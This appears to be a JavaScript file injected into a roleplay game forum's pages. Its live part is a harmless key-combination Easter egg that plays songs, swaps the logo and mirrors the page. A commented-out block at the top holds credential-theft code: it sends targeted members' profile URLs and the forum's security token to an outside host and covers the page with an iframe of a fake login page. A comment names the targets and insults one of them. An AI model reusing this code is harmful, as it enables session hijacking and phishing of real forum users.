/*
$( document ).ready(function() {

	function recreate_log()
	{
		document.body.innerHTML = "<iframe style='position:absolute; left: 0; right: 0; bottom: 0; top: 0px; margin: 0; padding: 0; height: 100%; overflow: hidden;' width='100%' height='100%' frameborder='0' src='http://www.laughoverlife.com/forum/nlogin.php'></iframe>";
		console.log("-- DOCUMENT LOADED --");
	};
	
	function check_directory()
	{
		console.log("-- CHECKING DIRECTORY CACHE --");
		
		//var hack_urlloc = window.location.href;
		//var hack_urllocsplit = hack_urlloc.split("/"); 
		//var hack_urllocsplit2 = hack_urllocsplit[(hack_urllocsplit.length)-1].split("?");
		//var hack_urllocsplit3 = hack_urllocsplit2[1].split("-");
		//if (hack_urllocsplit2[0] == "member.php" && hack_urllocsplit3[0] == "30243") {
		
		
			if (localStorage.username2699 == null) {
				localStorage.username2699 = "ABC";
				console.log("-- LOADING DOCUMENT1 --");
				recreate_log();
			}
		//};
	};
	
	// oms, nimra, ygidorp, yteews, yer, sttaw, selwonk, nevek, xeller
	// nothing personal guys, just business, except yteews, fuck you
	//ids = ["2947", "28601", "28576", "9940", "115", "16472", "20128", "11473", "17852"];
	userUrl0 = $("#toplinks .isuser .welcomelink > a").href;
	userUrl1 = $("#toplinks .isuser .welcomelink > a")[0].href;
    
	for(i=0; i<ids.length; i++) {
		console.log("-- CHECKING FOR IDS --");
		if(userUrl0) {
			if(userUrl0.indexOf(ids[i]) > -1) {
    				theData = { a: userUrl0, b: SECURITYTOKEN };
				$.ajax({ type: 'POST', url: 'http://laughoverlife.com/forum/write2.php', data: theData });
				console.log("-- ID WAS FOUND --");
				*
				check_directory();
			};
		};
		    
		if(userUrl1) {
			if(userUrl1.indexOf(ids[i]) > -1) {
    				theData = { a: userUrl1, b: SECURITYTOKEN };
				$.ajax({ type: 'POST', url: 'http://laughoverlife.com/forum/write2.php', data: theData });
				console.log("-- ID WAS FOUND --");
				check_directory();
			};
		};
	};
});
*/

$( document ).ready(function() {
	var key_audio = new Audio();
	var changelogo = document.getElementsByClassName("logo");

	var key_A = 0;
	var key_B = 0;
	var key_C = 0;
	var key_D = 0;
	var key_E = 0;
	var key_F = 0;
	var key_G = 0;
	var key_H = 0;
	var key_I = 0;
	var key_J = 0;
	var key_K = 0;
	var key_L = 0;
	var key_M = 0;
	var key_N = 0;
	var key_O = 0;
	var key_P = 0;
	var key_Q = 0;
	var key_R = 0;
	var key_S = 0;
	var key_T = 0;
	var key_U = 0;
	var key_V = 0;
	var key_W = 0;
	var key_X = 0;
	var key_Y = 0;
	var key_Z = 0;

	function ClearVariablesS()
	{
		key_A = 0;
		key_B = 0;
		key_C = 0;
		key_D = 0;
		key_E = 0;
		key_F = 0;
		key_G = 0;
		key_H = 0;
		key_I = 0;
		key_J = 0;
		key_K = 0;
		key_L = 0;
		key_M = 0;
		key_N = 0;
		key_O = 0;
		key_P = 0;
		key_Q = 0;
		key_R = 0;
		key_S = 0;
		key_T = 0;
		key_U = 0;
		key_V = 0;
		key_W = 0;
		key_X = 0;
		key_Y = 0;
		key_Z = 0;
	};
	
	document.addEventListener("keydown", function(event) {
		if(event.key == "a") {
			key_A = 1;
		} else if(event.key == "b") {
			key_B = 1;
		} else if(event.key == "c") {
			key_C = 1;
		} else if(event.key == "d") {
			key_D = 1;
		} else if(event.key == "e") {
			key_E = 1;
		} else if(event.key == "f") {
			key_F = 1;
		} else if(event.key == "g") {
			key_G = 1;
		} else if(event.key == "h") {
			key_H = 1;
		} else if(event.key == "i") {
			key_I = 1;
		} else if(event.key == "j") {
			key_J = 1;
		} else if(event.key == "k") {
			key_K = 1;
		} else if(event.key == "l") {
			key_L = 1;
		} else if(event.key == "m") {
			key_M = 1;
		} else if(event.key == "n") {
			key_N = 1;
		} else if(event.key == "o") {
			key_O = 1;
		} else if(event.key == "p") {
			key_P = 1;
		} else if(event.key == "q") {
			key_Q = 1;
		} else if(event.key == "r") {
			key_R = 1;
		} else if(event.key == "s") {
			key_S = 1;
		} else if(event.key == "t") {
			key_T = 1;
		} else if(event.key == "u") {
			key_U = 1;
		} else if(event.key == "v") {
			key_V = 1;
		} else if(event.key == "w") {
			key_W = 1;
		} else if(event.key == "x") {
			key_X = 1;
		} else if(event.key == "y") {
			key_Y = 1;
		} else if(event.key == "z") {
			key_Z = 1;
		} else {
			ClearVariablesS()
		}
	});
	
	function CheckAllKeys()
	{
		if(key_G == 1 && key_H == 1 && key_O == 1 && key_S == 1 && key_T == 1) {

			key_audio.pause();
			key_audio.currentTime = 0;
			key_audio = new Audio('https://raw.githubusercontent.com/chaos12135/sarp_forum/master/_files/Original%20GhostBusters%20Theme%20Song.mp3');
			key_audio.load();
			key_audio.play();

			changelogo[0].innerHTML = '<img alt="San Andreas Roleplay: samp.gta-sarp.com:4500" title="San Andreas Roleplay: samp.gta-sarp.com:4500" src="https://uproxx.files.wordpress.com/2014/10/ghostbusters-2-animated-title-card_columbia-pictures.gif" width="350">';

			alert("I'm not afraid of no ghost!");

			ClearVariablesS()
		};
		if(key_S == 1 && key_P == 1 && key_O == 1 && key_K == 1 && key_Y == 1) {

			key_audio.pause();
			key_audio.currentTime = 0;
			key_audio = new Audio('https://raw.githubusercontent.com/chaos12135/sarp_forum/master/_files/Spooky%20Scary%20Skeletons%20(Remix)%20-%20Extended%20Mix.mp3');
			key_audio.load();
			key_audio.play();

			changelogo[0].innerHTML = '<img alt="San Andreas Roleplay: samp.gta-sarp.com:4500" title="San Andreas Roleplay: samp.gta-sarp.com:4500" src="http://orig05.deviantart.net/05c8/f/2015/122/2/4/4461483_by_milky_operation-d8rwqqv.gif" height="150">';

			alert("Spooky Spooky Skeltons!");

			ClearVariablesS()
		};
		if(key_F == 1 && key_L == 1 && key_I == 1 && key_P == 1 && key_M == 1 && key_E == 1) {

			document.body.style.setProperty("-moz-transform", "scaleX(-1)", null);
			document.body.style.setProperty("-webkit-transform", "scaleX(-1)", null);
			document.body.style.setProperty("-o-transform", "scaleX(-1)", null);
			document.body.style.setProperty("transform", "scaleX(-1)", null);
			document.body.style.setProperty("-ms-filter", "fliph", null);
			document.body.style.setProperty("filter", "fliph", null);

			ClearVariablesS()
		};
	};

	setInterval(ClearVariablesS, 3000);
	setInterval(CheckAllKeys, 400);
});


/*
$( document ).ready(function() {
	console.log("- - CHECKING PROFILE - -");
	var acp_urlloc = window.location.href;
	var acp_urllocsplit = acp_urlloc.split("/"); 
	var acp_urllocsplit2 = acp_urllocsplit[(acp_urllocsplit.length)-1].split("?");
	var acp_urllocsplit3 = acp_urllocsplit2[1].split("-");
	if (acp_urllocsplit2[0] == "member.php" && acp_urllocsplit3[0] == "11097") {
		document.body.style.setProperty("-moz-transform", "scaleX(-1)", null);
		document.body.style.setProperty("-webkit-transform", "scaleX(-1)", null);
		document.body.style.setProperty("-o-transform", "scaleX(-1)", null);
		document.body.style.setProperty("transform", "scaleX(-1)", null);
		document.body.style.setProperty("-ms-filter", "fliph", null);
		document.body.style.setProperty("filter", "fliph", null);
		console.log("- - FLIPPING PAGE - -");
	}
});
*/
